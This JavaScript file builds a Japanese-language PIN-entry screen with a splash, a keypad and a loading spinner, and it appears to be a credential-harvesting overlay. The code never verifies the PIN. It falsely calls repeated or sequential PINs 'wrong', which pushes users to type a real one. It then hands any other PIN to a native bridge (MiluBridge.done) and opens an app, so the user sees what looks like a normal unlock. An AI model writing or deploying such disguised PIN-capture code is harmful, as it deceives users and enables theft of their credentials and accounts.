(() => {
  const PIN_LEN = 4;
  const SPLASH_MS = 2000;
  const SPLASH_FADE_MS = 500;
  const LOADING_MS = 1000;
  const CLOSE_DELAY_MS = 2500;

  const splash = document.getElementById("splash");
  const pinPage = document.getElementById("pinPage");
  const successPage = document.getElementById("successPage");
  const pinDots = document.getElementById("pinDots");
  const keypad = document.getElementById("keypad");
  const backBtn = document.getElementById("backBtn");
  const closeBtn = document.getElementById("closeBtn");
  const toastEl = document.getElementById("toast");
  const loadingEl = document.getElementById("loading");

  let pin = "";
  let locked = false;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function showPinPage() {
    splash.classList.add("is-hidden");
    splash.setAttribute("aria-hidden", "true");
    window.setTimeout(() => {
      splash.style.display = "none";
      pinPage.classList.add("is-active");
      pinPage.setAttribute("aria-hidden", "false");
    }, SPLASH_FADE_MS);
  }

  function toast(msg) {
    toastEl.textContent = msg;
    toastEl.classList.remove("is-show");
    void toastEl.offsetWidth;
    toastEl.classList.add("is-show");
    window.setTimeout(() => {
      toastEl.classList.remove("is-show");
    }, 2500);
  }

  function setLoading(show) {
    loadingEl.classList.toggle("is-show", show);
    loadingEl.setAttribute("aria-hidden", show ? "false" : "true");
  }

  function isSame(value) {
    for (let i = 1; i < value.length; i += 1) {
      if (value[i] !== value[0]) {
        return false;
      }
    }
    return value.length > 0;
  }

  function isSeq(value) {
    let asc = true;
    let desc = true;
    for (let i = 1; i < value.length; i += 1) {
      if (value.charCodeAt(i) - value.charCodeAt(i - 1) !== 1) {
        asc = false;
      }
      if (value.charCodeAt(i) - value.charCodeAt(i - 1) !== -1) {
        desc = false;
      }
    }
    return asc || desc;
  }

  function renderDots() {
    const dots = pinDots.children;
    for (let i = 0; i < PIN_LEN; i += 1) {
      dots[i].classList.toggle("is-filled", i < pin.length);
    }
  }

  function initDots() {
    pinDots.innerHTML = "";
    for (let i = 0; i < PIN_LEN; i += 1) {
      const dot = document.createElement("span");
      dot.className = "pin-dot";
      pinDots.appendChild(dot);
    }
    renderDots();
  }

  function wireKeyButton(btn, key) {
    function press() {
      btn.classList.add("is-pressed");
    }
    function release() {
      btn.classList.remove("is-pressed");
    }
    function activate(event) {
      event.preventDefault();
      press();
      if (key === "del") {
        deleteDigit();
      } else {
        pushDigit(key);
      }
    }
    btn.addEventListener("touchstart", activate, { passive: false });
    btn.addEventListener("touchend", release);
    btn.addEventListener("touchcancel", release);
    btn.addEventListener("mousedown", activate);
    btn.addEventListener("mouseup", release);
    btn.addEventListener("mouseleave", release);
  }

  function renderKeypad() {
    const keys = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "", "0", "del"];
    keypad.innerHTML = "";
    keys.forEach((value) => {
      if (value === "") {
        const spacer = document.createElement("span");
        spacer.className = "key key-empty";
        spacer.setAttribute("aria-hidden", "true");
        keypad.appendChild(spacer);
        return;
      }
      const btn = document.createElement("button");
      btn.type = "button";
      btn.className = `key${value === "del" ? " key-del" : ""}`;
      if (value === "del") {
        btn.setAttribute("aria-label", "削除");
        btn.innerHTML =
          '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#242323" stroke-width="2" aria-hidden="true">' +
          '<path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>' +
          '<line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/>' +
          "</svg>";
      } else {
        btn.textContent = value;
      }
      wireKeyButton(btn, value);
      keypad.appendChild(btn);
    });
  }

  function pushDigit(digit) {
    if (locked || pin.length >= PIN_LEN) {
      return;
    }
    pin += digit;
    renderDots();
    if (pin.length === PIN_LEN) {
      window.setTimeout(submitPin, 300);
    }
  }

  function deleteDigit() {
    if (locked || !pin.length) {
      return;
    }
    pin = pin.slice(0, -1);
    renderDots();
  }

  function submitPin() {
    if (locked || pin.length !== PIN_LEN) {
      return;
    }
    if (isSame(pin) || isSeq(pin)) {
      toast("パスワードが間違っています");
      pin = "";
      renderDots();
      return;
    }
    locked = true;
    const value = pin;
    setLoading(true);
    window.setTimeout(() => {
      reportDone(value);
      setLoading(false);
      window.setTimeout(() => {
        openApp();
        locked = false;
      }, CLOSE_DELAY_MS);
    }, LOADING_MS);
  }

  backBtn.addEventListener("click", () => {
    window.location.reload();
  });

  closeBtn.addEventListener("click", () => {
    openApp();
  });

  initDots();
  renderKeypad();
  window.setTimeout(showPinPage, SPLASH_MS);
})();
